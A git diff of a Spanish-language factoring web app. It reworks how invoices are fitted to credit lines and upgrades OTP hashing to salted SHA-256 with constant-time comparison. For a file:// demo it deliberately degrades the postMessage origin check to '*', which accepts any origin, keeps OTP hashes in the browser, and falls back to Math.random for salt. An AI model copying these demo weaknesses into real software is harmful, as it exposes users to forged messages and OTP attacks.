+      const tipo = f.histFactoring ? tipoDeudorDisp(f) : (f.tipoDeudor || tipoDeudor(f.rutRecep, f.deudor));
+      return { f, prio: ORDEN_DEUDOR[tipo] != null ? ORDEN_DEUDOR[tipo] : 9, score: scoreDeudor(f.deudor, tipo).score, monto: f.montoMM || 0 };
+    })
+    .sort((a, b) => a.prio - b.prio || b.score - a.score || b.monto - a.monto)
+    .map((x) => x.f);
+}
+// Reparte las facturas en las que CABEN en el cupo y las que no. Se salta la que no entra y sigue con
+// la siguiente (no corta al primer exceso): así se aprovecha el cupo con los mejores deudores posibles.
+function ajustarACupo(facturas, disponible) {
+  const dentro = [], fuera = [];
+  let acum = 0;
+  for (const f of ordenarPorCalidadDeudor(facturas)) {
+    const m = f.montoMM || 0;
+    if (acum + m <= disponible + 0.001) { dentro.push(f); acum += m; }
+    else fuera.push({ ...f, porCupo: true }); // marcada: excluida por cupo, NO por ser deudor «Otro»
+  }
+  // Cliente sin cupo para ninguna factura: igual tiene que existir la oportunidad (es justamente el
+  // caso que dispara «Líneas por gestionar»), así que se deja la mejor factura y el resto al pool.
+  if (!dentro.length && fuera.length) {
+    // Ninguna cabe: igual tiene que existir la oportunidad (es el caso que alimenta «Líneas por
+    // gestionar»), pero se deja la de MENOR monto dentro del mejor tramo de deudor. Antes se dejaba
+    // fuera[0], que tras el orden es la más CARA: maximizaba el exceso de línea en vez de minimizarlo.
+    const prioDe = (f) => { const t = f.histFactoring ? tipoDeudorDisp(f) : (f.tipoDeudor || tipoDeudor(f.rutRecep, f.deudor)); return ORDEN_DEUDOR[t] != null ? ORDEN_DEUDOR[t] : 9; };
+    const mejorPrio = Math.min.apply(null, fuera.map(prioDe));
+    const cand = fuera.filter((f) => prioDe(f) === mejorPrio);
+    const elegida = cand.reduce((a, b) => ((b.montoMM || 0) < (a.montoMM || 0) ? b : a));
+    const resto = fuera.filter((f) => f !== elegida);
+    delete elegida.porCupo;
+    dentro.push(elegida);
+    fuera.length = 0; fuera.push.apply(fuera, resto);
+  }
+  return { dentro, fuera, usado: +acum.toFixed(1) };
+}
+// Recorte del paquete propuesto usando el MOTOR DE ASIGNACIÓN, no una noción de cupo aparte: entran
+// las facturas a las que el motor pudo asignarles línea y el resto queda disponible para agregar a
+// mano. Mantener dos caminos de cálculo —uno para proponer y otro para evaluar— garantiza que en
+// algún momento diverjan, y el síntoma sería una oferta recién creada que ya nace con facturas en
+// «Requiere comité» sin que nadie las haya agregado.
+// Como en `ajustarACupo`, si no cabe ninguna igual se deja una: la oportunidad tiene que existir
+// porque es justamente la que alimenta «Líneas por gestionar».
+// Escenario de línea que debe exhibir la oferta de cada cliente CON línea asignada. Sin esto, como
+// el recorte deja pasar sólo lo que cabe, todas las oportunidades nacían cursables al 100% y los
+// casos que la pantalla existe para mostrar —tope del par, tope del deudor, deudor sin línea propia—
+// sólo aparecían si el ejecutivo agregaba facturas a mano.
+// No contradice la regla de no proponer lo incursable: en estos perfiles el paquete incluye la
+// demanda que el cliente SÍ quiere factorizar y que su línea no cubre, que es exactamente lo que
+// tiene que llegar al comité. El perfil `holgado` mantiene el recorte estricto.
+const PERFIL_LINEA = ["holgado", "holgado", "holgado", "holgado", "tope_par", "tope_par", "tope_deudor", "tope_deudor"];
+const MOTIVO_DE_PERFIL = { tope_par: "par", tope_deudor: "deudor", sin_par: "lf4" };
+const perfilLineaCliente = (rutCliente) => PERFIL_LINEA[hashStr("perfilLinea" + (rutCliente || "")) % PERFIL_LINEA.length];
+
+function cortarConMotorLinea(facturas, rutCliente) {
+  if (!facturas || !facturas.length) return { dentro: [], fuera: [], usado: 0 };
+  const r = asignarLineas(facturas, rutCliente);
+  const conLinea = new Set(r.facturas.filter((f) => f.estado === "CON_LINEA").map((f) => f.id));
+  // Según el perfil, se incorporan además algunas facturas que la línea no cubre, priorizando las
+  // del motivo que ese cliente debe ilustrar. Si no hay del motivo buscado se toman las que haya:
+  // vale más mostrar el flujo a comité que forzar un escenario que este cliente no tiene.
+  const perfil = perfilLineaCliente(rutCliente);
+  const objetivo = MOTIVO_DE_PERFIL[perfil];
+  if (objetivo) {
+    const rech = r.facturas.filter((f) => f.estado === "REQUIERE_COMITE");
+    const delMotivo = rech.filter((f) => f.motivo === objetivo);
+    const tope = facturas.reduce((s2, f) => s2 + (f.montoMM || 0), 0) * 0.4;
+    const pool = (delMotivo.length ? delMotivo : rech).slice().sort((a, b) => a.monto - b.monto);
+    const nMax = 1 + (hashStr("nExc" + rutCliente) % 3); // 1–3 facturas por sobre la línea
+    let acum = 0, n = 0;
+    for (const f of pool) {
+      if (n >= nMax || acum + f.monto > tope) break;
+      conLinea.add(f.id); acum += f.monto; n++;
+    }
+  }
+  const dentro = facturas.filter((f) => conLinea.has(f.id));
+  const fuera = facturas.filter((f) => !conLinea.has(f.id)).map((f) => ({ ...f, porCupo: true }));
+  if (!dentro.length && fuera.length) {
+    const prioDe = (f) => { const t = f.histFactoring ? tipoDeudorDisp(f) : (f.tipoDeudor || tipoDeudor(f.rutRecep, f.deudor)); return ORDEN_DEUDOR[t] != null ? ORDEN_DEUDOR[t] : 9; };
+    const mejorPrio = Math.min.apply(null, fuera.map(prioDe));
+    const cand = fuera.filter((f) => prioDe(f) === mejorPrio);
+    const elegida = cand.reduce((a, b) => ((b.montoMM || 0) < (a.montoMM || 0) ? b : a));
+    const resto = fuera.filter((f) => f !== elegida);
+    delete elegida.porCupo;
+    return { dentro: [elegida], fuera: resto, usado: +(elegida.montoMM || 0).toFixed(1) };
+  }
+  return { dentro, fuera, usado: +dentro.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1) };
 }
 // Facturas CANDIDATAS: documentos nuevos del cliente que llegaron y aún NO son parte de la oferta.
 // Se itemizan a partir del conteo/monto pendiente para poder agregarlas una a una o todas.
@@ -2132,7 +2493,8 @@ function candidatasDe(deal) {
   const yaEnOp = new Set((deal.facturasOp || []).map((f) => f.id));
   for (const f of disp) {
     if (yaEnOp.has(f.id)) continue;
-    out.push({ ...f, candidata: true, otro: true, venc: f.venc || diasPagoDeudor(f.deudor) });
+    // `porCupo` = quedó fuera por la línea disponible, no por ser deudor «Otro»: conserva su tipo real.
+    out.push({ ...f, candidata: true, otro: !f.porCupo, venc: f.venc || diasPagoDeudor(f.deudor) });
   }
   // Facturas RETIRADAS de la oferta: vuelven al pool de candidatas conservando su deudor/tipo
   // (para poder re-agregarlas). No se fuerzan a "Otro".
@@ -2170,11 +2532,23 @@ function estadoCandidata(f, deal) {
 // Determinista por operación. El listado se pagina (lote óptimo) para no renderizar todo el libro de una vez.
 function candidatasLibro(deal, enOferta) {
   const reales = candidatasDe(deal); // candidatas reales (Otro / nuevas / retiradas) — conservan su folio
+  // Se conserva el RUT junto al nombre: sin el, el motor de asignacion no puede calzar la factura
+  // con la linea del par cliente-deudor (que se identifica por RUT) y toda factura del libro caeria
+  // a la linea de otros deudores por construccion.
+  const rutPorNombre = {}; deudoresDeDeal(deal).forEach((d) => { if (d.nombre && d.rut) rutPorNombre[d.nombre] = d.rut; });
   const deudores = (deal.deudores && deal.deudores.length ? deal.deudores.map((d) => d.name) : [deal.deudor]).filter(Boolean);
   const pool = deudores.length ? deudores : ["Deudor"];
   const folioTope = Math.max(0, ...(enOferta || []).map((f) => +f.folio || 0), ...reales.map((f) => +f.folio || 0));
   const N = 40 + (Math.abs(hashStr("libro" + (deal.id || ""))) % 41); // 40–80 facturas en 60 días
   const topFolio = (folioTope || 100000) + N + 6; // el folio más nuevo queda sobre lo ya en oferta
+  // Clasificación del deudor tal como YA la trae este negocio: el libro sintetiza facturas de los
+  // mismos deudores, así que tienen que clasificar igual. Sin esto el objeto no llevaba `tipoDeudor`,
+  // `tipoDeudorDisp` caía a "Otro" y el motor le negaba la LF1 a deudores Lista Blanca.
+  const clasePorDeudor = {};
+  [...(enOferta || []), ...(deal.facturasOp || []), ...(reales || [])].forEach((f) => {
+    if (f && f.deudor && f.tipoDeudor && !clasePorDeudor[f.deudor]) clasePorDeudor[f.deudor] = { tipoDeudor: f.tipoDeudor, histFactoring: f.histFactoring || null };
+  });
+  const claseDe = (dn) => clasePorDeudor[dn] || { tipoDeudor: tipoDeudor(rutPorNombre[dn] || null, dn), histFactoring: null };
   const usados = new Set((reales || []).map((f) => +f.folio));
   const out = [];
   for (let i = 0; i < N; i++) {
@@ -2184,7 +2558,7 @@ function candidatasLibro(deal, enOferta) {
     const deudor = pool[h % pool.length];
     const montoMM = +(0.8 + (h % 900) / 100).toFixed(1);
     const diasEmision = Math.round((i / Math.max(1, N - 1)) * 60); // 0 (más nueva) .. 60 (más antigua)
-    out.push({ id: `LIB-${deal.id}-${folio}`, folio, tipo: "Factura electrónica (33)", deudor, montoMM, venc: diasPagoDeudor(deudor), candidata: true, otro: (h % 5 === 0), diasEmision });
+    out.push({ id: `LIB-${deal.id}-${folio}`, folio, tipo: "Factura electrónica (33)", deudor, rutRecep: rutPorNombre[deudor] || "", ...claseDe(deudor), montoMM, venc: diasPagoDeudor(deudor), candidata: true, otro: (h % 5 === 0), diasEmision });
   }
   // Las candidatas reales (Otro/retiradas) se integran al libro conservando su folio.
   for (const f of reales) out.push({ ...f, diasEmision: f.diasEmision != null ? f.diasEmision : 60 });
@@ -2231,7 +2605,15 @@ setTimeout(function(){try{window.close();}catch(e){}},1600);}
 // exacto de la app (https://…) y la confirmación de firma no llega por postMessage sino por un
 // webhook server-to-server autenticado del portal de firma.
 // En el demo file:// el origen del navegador es "null" y postMessage exige "*": ahí, y sólo ahí, se degrada.
-const ORIGEN_APP = (typeof location !== "undefined" && location.origin && location.origin !== "null") ? location.origin : "*";
+// Chrome en una página file:// devuelve location.origin === "file://" (NO "null"), pero los mensajes
+// que SALEN de esa página llegan con ev.origin === "null", y un targetOrigin "file://" no se entrega:
+// se descarta en silencio, sin excepción. Comparando location.origin con "null" el fallback nunca se
+// activaba, así que bajo el lanzador del repo (file://) el canal postMessage quedaba muerto en los dos
+// sentidos: la app descartaba TODO mensaje entrante y todo saliente se perdía. Se detecta por PROTOCOLO.
+const ES_FILE = (typeof location !== "undefined") && (location.protocol === "file:" || location.origin === "null" || !location.origin);
+const ORIGEN_APP = ES_FILE ? "*" : ((typeof location !== "undefined" && location.origin) || "*");
+// Con ORIGEN_APP === "*" la guarda no filtra nada: es el precio de que el demo funcione por file://.
+// Servido por http(s) —que es como se ejecuta de verdad— la comparación vuelve a ser estricta.
 const origenConfiable = (o) => ORIGEN_APP === "*" || o === ORIGEN_APP;
 const BUS_NAME = "factoringsecurity-curse";
 function makeBus(name) {
@@ -2261,6 +2643,44 @@ const negDe = (d) => (d && d.id != null) ? String(d.id) : "—";
 //   · expira (TTL) y se invalida al primer uso.
 // hashStr NO es un hash criptográfico: en producción esto es argon2/bcrypt y la validación ocurre
 // en el servidor, no comparando contra un registro que el cliente puede leer.
+// ============================================================
+// A02 — CRYPTOGRAPHIC FAILURES · HASH DE VERDAD DONDE HACE FALTA
+// ============================================================
+// `hashStr` es un hash de 32 bits estilo Java (h = h*31 + c). Para repartir semillas deterministas está
+// perfecto y ahí se queda. NO servía para los dos usos donde estaba:
+//   · OTP — teniendo el hash guardado, los 10^6 códigos de 6 dígitos se prueban en milisegundos. Y peor
+//     que eso: en 32 bits hay colisiones, así que un código EQUIVOCADO podía validar como correcto.
+//   · Cadena de integridad de la auditoría — una colisión permite reescribir un registro sin que la
+//     verificación lo note, que es justo lo que la cadena tenía que impedir.
+// Ambos pasan a SHA-256 por Web Crypto. Es asíncrono, así que las funciones que lo usan también.
+//
+// Sobre el alcance: SHA-256 sin secreto da EVIDENCIA de manipulación, no protección. Quien controla el
+// navegador puede recalcular toda la cadena, porque tiene el algoritmo y no hay clave. La protección
+// real es que la auditoría viva en una tabla append-only del servidor, firmada con HMAC y una clave que
+// el cliente nunca ve. Esto sube el piso; no cierra el tema.
+const SUBTLE = (typeof window !== "undefined" && window.crypto && window.crypto.subtle) || null;
+const HASH_ALG = SUBTLE ? "sha256" : "hashStr-inseguro";
+async function sha256Hex(txt) {
+  if (!SUBTLE) return "x" + hashStr(String(txt)); // degradado y MARCADO en `alg`/`hAlg`: nunca silencioso
+  const buf = await SUBTLE.digest("SHA-256", new TextEncoder().encode(String(txt)));
+  return Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
+}
+// Comparación en tiempo constante: `!==` sobre strings corta en el primer byte distinto y filtra, por
+// tiempo, cuántos caracteres del hash se acertaron.
+function igualConstante(a, b) {
+  const x = String(a == null ? "" : a), y = String(b == null ? "" : b);
+  let dif = x.length ^ y.length;
+  for (let i = 0; i < Math.max(x.length, y.length); i++) dif |= (x.charCodeAt(i) || 0) ^ (y.charCodeAt(i) || 0);
+  return dif === 0;
+}
+// Sal por emisión: sin ella, un mismo código para un mismo negocio siempre da el mismo hash, y una
+// tabla precalculada de 10^6 entradas lo revierte de una.
+function salAleatoria(n = 16) {
+  const d = new Uint8Array(n);
+  try { (window.crypto || window.msCrypto).getRandomValues(d); }
+  catch (_) { for (let i = 0; i < n; i++) d[i] = Math.floor(Math.random() * 256); }
+  return Array.from(d).map((b) => b.toString(16).padStart(2, "0")).join("");
+}
 const OTP_TTL_MS = 30 * 60000; // vigencia del código entregado al cliente
 const OTP_LARGO = 6;
 let OTP_STORE = {}; // { [neg]: { hash, exp, usado, emitido } } — en producción: tabla otp(neg, hash, exp, usado)
@@ -2271,20 +2691,24 @@ function otpAleatorio(n) {
   let s = ""; for (let i = 0; i < n; i++) s += String(d[i] % 10);
   return s;
 }
-const otpHash = (neg, code) => String(hashStr("otp$" + neg + "$" + code));
+const otpHash = (neg, sal, code) => sha256Hex("otp$" + neg + "$" + sal + "$" + code);
 // Emite el OTP del negocio. Devuelve el código en claro UNA vez (para el canal); sólo se guarda el hash.
-function emitirOtp(neg) {
+// El hash NO puede salir del servidor: con él en la mano, el límite de intentos deja de proteger nada
+// (se prueba offline). Acá vive en memoria del cliente sólo porque no hay backend.
+async function emitirOtp(neg) {
   const code = otpAleatorio(OTP_LARGO);
-  OTP_STORE[neg] = { hash: otpHash(neg, code), exp: Date.now() + OTP_TTL_MS, usado: false, emitido: Date.now() };
+  const sal = salAleatoria();
+  OTP_STORE[neg] = { alg: HASH_ALG, sal, hash: await otpHash(neg, sal, code), exp: Date.now() + OTP_TTL_MS, usado: false, emitido: Date.now() };
+  if (!SUBTLE) logSys("error", "app", "Web Crypto no disponible: el OTP quedó con un hash NO criptográfico. Revisar el contexto seguro (https/localhost).", { alg: HASH_ALG, negocio: neg });
   return code;
 }
 // Valida y consume el OTP. En producción esta función es un resolver del backend.
-function validarOtp(neg, code) {
+async function validarOtp(neg, code) {
   const r = OTP_STORE[neg];
   if (!r) return { ok: false, error: "No hay un código vigente" };
   if (r.usado) return { ok: false, error: "Ese código ya fue utilizado" };
   if (Date.now() > r.exp) return { ok: false, error: "El código expiró" };
-  if (r.hash !== otpHash(neg, String(code || ""))) return { ok: false, error: "El código no es correcto" };
+  if (!igualConstante(r.hash, await otpHash(neg, r.sal, String(code || "")))) return { ok: false, error: "El código no es correcto" };
   r.usado = true;
   return { ok: true };
 }
@@ -2295,7 +2719,8 @@ const CURSE_TTL_MS = 14 * 86400000, CURSE_MAX = 40;
 function cursePersist(neg, obj) {
   try {
     // El registro lo lee curse.html (otra página): por eso lleva el esquema DENTRO del objeto y no en un
-    // envoltorio. v2 = OTP hasheado; un registro v1 (OTP en claro) queda obsoleto y el portal lo rechaza.
+    // envoltorio. v3 = OTP con SHA-256 + sal; un v2 (hash de 32 bits) o un v1 (OTP en claro) quedan
+    // obsoletos y el portal los rechaza: el enlace se considera vencido y hay que reenviarlo.
     localStorage.setItem("fs_curse_" + neg, JSON.stringify({ ...obj, _v: SCHEMA_VERSION.curse, _app: APP_VERSION }));
     const now = Date.now(), entries = [];
     for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); if (k && k.indexOf("fs_curse_") === 0) { let ts = 0; try { ts = (JSON.parse(localStorage.getItem(k)) || {}).ts || 0; } catch (_) {} entries.push({ k, ts }); } }
@@ -2756,7 +3181,7 @@ function DealCard({ deal, onOpen, onDragStart }) {
       </div>
       <div className="mt-1.5 flex flex-wrap items-center gap-1.5">
         {deal.waPendiente && (
-          <span className="inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t10 font-semibold" style={{ backgroundColor: "#fef2f2", color: "#DC2626", border: "1px solid #fecaca" }} title="El cliente respondió por WhatsApp y la conversación está pendiente de respuesta del ejecutivo.">
+          <span className="inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t10 font-semibold" style={{ backgroundColor: "#fef2f2", color: "#EF4444", border: "1px solid #fecaca" }} title="El cliente respondió por WhatsApp y la conversación está pendiente de respuesta del ejecutivo.">
             <MessageSquare size={11} /> Conversación pendiente
           </span>
         )}
@@ -2764,7 +3189,7 @@ function DealCard({ deal, onOpen, onDragStart }) {
       {deal.cat && <OppTags ev={deal} />}
       {/* Estado terminal Perdida: badge con la CAUSA ESPECÍFICA (nunca el genérico "no superó reglas"). */}
       {isPerdida && (
-        <div className="mt-1.5 flex items-start gap-1 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#fef2f2", color: "#DC2626", cursor: "help" }} title={`Origen: ${stageName(deal.etapaPerdida || "prospeccion")} · ${deal.fechaPerdida || ""}`}>
+        <div className="mt-1.5 flex items-start gap-1 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#fef2f2", color: "#EF4444", cursor: "help" }} title={`Origen: ${stageName(deal.etapaPerdida || "prospeccion")} · ${deal.fechaPerdida || ""}`}>
           <X size={10} className="mt-0.5 shrink-0" /> <span>Perdida · {causaPerdidaDeal(deal)}</span>
         </div>
       )}
@@ -2772,7 +3197,7 @@ function DealCard({ deal, onOpen, onDragStart }) {
       {["prospeccion", "oferta", "aceptadas", "otorgamiento"].includes(deal.stage) && (() => {
         const vis = visadoDeal(deal);
         if (vis.rechFirme.length || vis.excRech.length) { const tip = "No superó las reglas de otorgamiento (bloqueo firme):\n" + [...vis.rechFirme, ...vis.excRech].map((r, i) => `${i + 1}) #${r.n} ${r.nombre}`).join("\n"); return (
-          <div className="mt-1.5 flex items-center gap-1.5 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#fef2f2", color: "#DC2626", cursor: "help" }} title={tip}>
+          <div className="mt-1.5 flex items-center gap-1.5 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#fef2f2", color: "#EF4444", cursor: "help" }} title={tip}>
             <X size={10} /> Perdida · Bloqueo firme: {[...vis.rechFirme, ...vis.excRech].map((r) => `${r.nombre} (#${r.n})`).join("; ")}
           </div>
         ); }
@@ -2797,17 +3222,6 @@ function DealCard({ deal, onOpen, onDragStart }) {
       {deal.simulado && (
         <div className="mt-1 t10" style={{ color: C.sub }}>
           Giro {fmtMM(deal.giroMM)} · {deal.diasFin}d fin. · vence {deal.fechaVenc}
-        </div>
-      )}
-      {/* Proceso en background: el backend está re-simulando la oportunidad tras recibir facturas nuevas. */}
-      {deal.actualizando && (
-        <div className="mt-1.5 flex items-center gap-1.5 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#F5F3FF", color: "#7C3AED" }}>
-          <RotateCcw size={10} className="pl-spin" /> Actualizando la oportunidad…
-        </div>
-      )}
-      {!deal.actualizando && deal.warning && ["prospeccion", "oferta"].includes(deal.stage) && (
-        <div className="mt-1.5 flex items-center gap-1 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#FFF7ED", color: "#C2410C" }}>
-          <AlertTriangle size={10} /> {deal.nuevasFacturas} factura(s) nueva(s) · {fmtMM(deal.nuevasFacturasMontoMM || 0)} sin incorporar
         </div>
       )}
       {deal.contactable === false && !isPerdida && !deal.telValidado && !deal.emailValidado && !deal.verifManual && (
@@ -2900,16 +3314,18 @@ function DealCard({ deal, onOpen, onDragStart }) {
 // Mini-gráfico de barras (ventana móvil) para la evolución de actividad.
 // Si se entrega `dataSel`, cada barra se dibuja en dos capas: el total sin filtro (transparente,
 // barra completa) y la porción del usuario seleccionado (sólida, anclada a la base).
-function Sparkline({ data, dataSel, color }) {
+function Sparkline({ data, dataSel, color, ranuras = 30, alto = "h-4" }) {
   if (!data || data.length < 1) return null;
-  // Ranuras fijas (30): las barras nacen finas a la izquierda y conservan su grosor
-  // a medida que se agregan datos a la serie (en vez de partir gruesas y adelgazar).
-  const SLOTS = 30;
+  // Ranuras fijas: las barras nacen finas a la izquierda y conservan su grosor a medida que se agregan
+  // datos a la serie (en vez de partir gruesas y adelgazar). Menos ranuras = barras más gruesas; el
+  // viewBox se estira con preserveAspectRatio="none", así que el grosor final en px depende también
+  // del ancho del contenedor.
+  const SLOTS = ranuras;
   const w = 120, h = 16, max = Math.max(1, ...data), n = data.length, bw = w / SLOTS;
   const hasSel = Array.isArray(dataSel);
   const bwR = Math.max(0.6, bw * 0.76);
   return (
-    <svg viewBox={`0 0 ${w} ${h}`} preserveAspectRatio="none" className="h-4 w-full">
+    <svg viewBox={`0 0 ${w} ${h}`} preserveAspectRatio="none" className={alto + " w-full"}>
       {data.map((v, i) => {
         const bh = Math.max(0.6, (v / max) * (h - 1));
         // Se despliega de derecha a izquierda: el dato más reciente queda anclado a la derecha.
@@ -3315,29 +3731,6 @@ function bitacoraDe(deal) {
   ev.sort((a, b) => (a.t - b.t) || (a.seq - b.seq));
   return ev;
 }
-// Resumen IA del historial de la oportunidad (de la prospección al estado actual). Se sintetiza a
-// partir de los datos y la conversación; en producción lo genera un LLM con el historial completo.
-function resumenIA(deal) {
-  const nombre = (deal.contacto && deal.contacto.nombre) || "el contacto";
-  const canal = deal.canalContacto === "Llamada" ? "Call Center" : (deal.canalContacto || "Inbound");
-  const etapa = (STAGES.find((s) => s.id === deal.stage) || {}).name || deal.stage;
-  const deudores = deal.deudores && deal.deudores.length ? deal.deudores.map((d) => d.name).join(", ") : deal.deudor;
-  const nDeud = (deal.deudores && deal.deudores.length) || 1;
-  const wa = deal.waSesion || [];
-  const hayOferta = wa.some((m) => /Oferta de factoring/i.test(m.text || ""));
-  const hayBoton = wa.some((m) => m.tipo === "boton");
-  const aceptado = ["aceptadas", "cesion", "giro"].includes(deal.stage);
-  const p = [];
-  p.push(`Esta oportunidad de ${deal.cliente} se originó en prospección${deal.reglaId ? ` (regla ${deal.reglaId})` : ""}: ${deal.facturas} factura(s) por ${fmtMM(deal.amountMM)} sobre ${nDeud} deudor(es) — ${deudores}.`);
-  if (deal.contactable === false) p.push(`No se logró contacto con ${nombre} tras los intentos por ${canal}; la oportunidad sigue sin respuesta.`);
-  else if (deal.fueraAtribucion) p.push(`El Agente IA contactó a ${nombre} por ${canal} y ofreció su mejor tasa autorizada para ${deal.deudor} (mínimo ${tasaMinIA(deal.deudor).toFixed(2)}% mensual, spread mínimo ${spreadMinDeudor(deal.deudor).toFixed(2)}%), pero el cliente pidió ${deal.tasaSolicitada ? deal.tasaSolicitada.toFixed(2) + "% mensual" : "una tasa menor"} — bajo el spread mínimo del deudor. El caso se derivó a un ejecutivo para negociar.`);
-  else p.push(`Se contactó a ${nombre} por ${canal} con resultado positivo.`);
-  if (hayOferta) p.push(`El ejecutivo publicó una oferta de cierre a ${deal.tasa}${deal.simulado ? `, ${deal.anticipo} de anticipo y un monto a girar de ${fmtMM(deal.giroMM)}` : ""}.`);
-  if (aceptado) p.push(`El cliente aceptó y firmó la operación en la plataforma de Factoring Security.`);
-  else if (hayBoton) p.push(`El cliente aceptó la oferta; se le envió el botón para firmar el cierre en la plataforma de Factoring Security (pendiente de firma).`);
-  p.push(`Estado actual: ${etapa}${deal.status ? ` — ${deal.status}.` : "."}`);
-  return p;
-}
 // Next Best Action: la acción concreta que el ejecutivo debería realizar a continuación en esta operación.
 // Es determinista según el estado real del negocio (contacto, etapa, oferta, escalamiento, otorgamiento…),
 // con una recomendación principal + hints secundarios (SOW, facturas disponibles). En producción la afinaría
@@ -3349,16 +3742,21 @@ function nextBestAction(deal) {
   const contactado = deal.contactable !== false && (verificado || deal.contactoExitoso);
   const sec = [];
   if (deal.sowTendencia === "Decreciente") sec.push("SOW a la baja: promueve una mejor tasa para recuperar participación frente a la competencia.");
-  if ((deal.facturasDisponibles || []).length) sec.push(`Existen facturas de otros deudores disponibles para incluir manualmente (irán a Otorgamiento).`);
+  if ((deal.facturasDisponibles || []).length) {
+    const nCupo = (deal.facturasDisponibles || []).filter((f) => f.porCupo).length;
+    sec.push(nCupo
+      ? `Hay ${nCupo} factura(s) que no caben en la línea disponible y otras de deudores «Otro»: se pueden incluir manualmente, pero la operación irá a Otorgamiento.`
+      : `Existen facturas de otros deudores disponibles para incluir manualmente (irán a Otorgamiento).`);
+  }
   const out = (label, detalle, color, goTab) => ({ label, detalle, color, goTab, sec });
-  if (deal.stage === "perdida") return out("Re-prospectar más adelante", deal.perdidaCesion ? `Perdida ante ${deal.cedidaCompetidor || "la competencia"}. Monitorea AECSync y vuelve a ofertar cuando el cliente emita nuevas facturas.` : "El cliente no avanzó. Re-contáctalo en una próxima ventana con una mejor propuesta.", "#DC2626", "bitacora");
+  if (deal.stage === "perdida") return out("Re-prospectar más adelante", deal.perdidaCesion ? `Perdida ante ${deal.cedidaCompetidor || "la competencia"}. Monitorea AECSync y vuelve a ofertar cuando el cliente emita nuevas facturas.` : "El cliente no avanzó. Re-contáctalo en una próxima ventana con una mejor propuesta.", "#EF4444", "bitacora");
   if (deal.stage === "giro") return out("Seguimiento de pago (cobranza)", `Operación girada por ${fmtMM(deal.giroMM || 0)}. Monitorea el pago del deudor al vencimiento y la cobranza.`, "#16a34a", "cobranza");
   // Empresa fuera de cartera: no es cliente del factoring, no está enrolada y por tanto no tiene acceso al
   // portal. Aunque la contactes, la oferta no se puede cerrar porque el cliente no tendría cómo loguearse
   // para firmar. Primero hay que convertirla en cliente (enrolamiento valida a su primer usuario).
   if (deal.esCliente === false) return out("Hacer cliente para ofertar", "Esta empresa no está en la cartera (no es cliente del factoring): no está enrolada y no tiene acceso al portal, por lo que la oportunidad no se puede cerrar — el cliente no tendría cómo loguearse para firmar. Conviértela primero en cliente (el enrolamiento valida a su primer usuario) y recién ahí levanta la oferta.", "#C2410C", "negocio");
-  if (deal.ofertaSolicitada && !deal.ofertaCerrada && !deal.negocioNum) return out("Revisar selección y cerrar la oferta", "El cliente pidió ver la oferta por WhatsApp. Revisa las facturas del paquete y presiona «Cerrar oferta»: hasta cerrarla, ni tú ni el Agente IA pueden enviársela.", "#dc2626", "negocio");
-  if (deal.waPendiente) return out("Responder al cliente", "El cliente respondió por WhatsApp y la conversación quedó PENDIENTE. Respóndele por el chat (modo manual) para no perder el cierre.", "#dc2626", "comunicaciones");
+  if (deal.ofertaSolicitada && !deal.ofertaCerrada && !deal.negocioNum) return out("Revisar selección y cerrar la oferta", "El cliente pidió ver la oferta por WhatsApp. Revisa las facturas del paquete y presiona «Cerrar oferta»: hasta cerrarla, ni tú ni el Agente IA pueden enviársela.", "#EF4444", "negocio");
+  if (deal.waPendiente) return out("Responder al cliente", "El cliente respondió por WhatsApp y la conversación quedó PENDIENTE. Respóndele por el chat (modo manual) para no perder el cierre.", "#EF4444", "comunicaciones");
   if (deal.stage === "otorgamiento") return out("Coordinar Otorgamiento", "La operación está en la mesa de crédito. Coordina con Riesgo/Operaciones para autorizar las causas de desvío y liberar el giro.", "#7C3AED", "otorgamiento");
   if (deal.stage === "cesion") return out("Seguimiento de la cesión", "Aceptada y firmada. Verifica la inscripción de la cesión electrónica (AEC) para avanzar a Otorgamiento/Giro.", "#0d9488", "bitacora");
   if (deal.stage === "aceptadas") return out("Gestionar la cesión", "El cliente firmó el cierre. Gestiona la cesión de las facturas a Factoring Security para cursar el giro.", "#0ea5e9", "contacto");
@@ -3403,7 +3801,7 @@ function esClienteNuevoNEX(deal) {
 }
 // ---- Estado de Share of Wallet del cliente (semáforo + detalle mensual minimalista) ----
 // Color del número del mes según el SOW de ese mes respecto del target.
-const SOW_EST_COLOR = { ok: "#16A34A", info: "#ca8a04", warn: "#ea580c", bad: "#dc2626", sd: "#9CA3AF" };
+const SOW_EST_COLOR = { ok: "#16A34A", info: "#ca8a04", warn: "#ea580c", bad: "#EF4444", sd: "#9CA3AF" };
 // Tarjeta de competencia (cesiones a otros factores): SIEMPRE muestra BICE + los 3 primeros competidores
 // y colapsa el resto tras un botón. Se usa en todos los estados de SOW (en target, bajando, riesgo, nuevo).
 function CompetenciaCard({ cm, sow, compact }) {
@@ -3455,7 +3853,7 @@ function ConversacionActivaItem({ info, onOpen }) {
   const { d, pendiente, oferta, mins, ult, contacto } = info;
   const hora = ult ? new Date(ult).toLocaleTimeString("es-CL", { hour: "2-digit", minute: "2-digit" }) : "—";
   const estadoTxt = pendiente ? "Pendiente de respuesta" : oferta ? "Oferta enviada" : "Cliente respondió";
-  const estadoCol = pendiente ? "#DC2626" : "#16A34A";
+  const estadoCol = pendiente ? "#EF4444" : "#16A34A";
   const etapa = (STAGES.find((s) => s.id === d.stage) || {}).name || d.stage;
   const lastM = (d.waSesion || []).filter((m) => m.text).slice(-1)[0];
   const lastFrom = lastM ? (lastM.from === "cliente" ? "Cliente" : lastM.from === "ejecutivo" ? "Ejecutivo" : lastM.from === "agente" ? "Agente IA" : "Sistema") : null;
@@ -3495,7 +3893,7 @@ function SowStatusPanel({ deal, sinCompetencia }) {
       <div className="mt-4">
         <div className="flex items-baseline gap-2">
           <span className="t13 font-semibold" style={{ color: C.ink }}>SOW</span>
-          <span className="t11 font-medium" style={{ color: cm ? "#DC2626" : "#2563EB" }}>{cm ? "Nuevo · 0% Security" : "Nuevo"}</span>
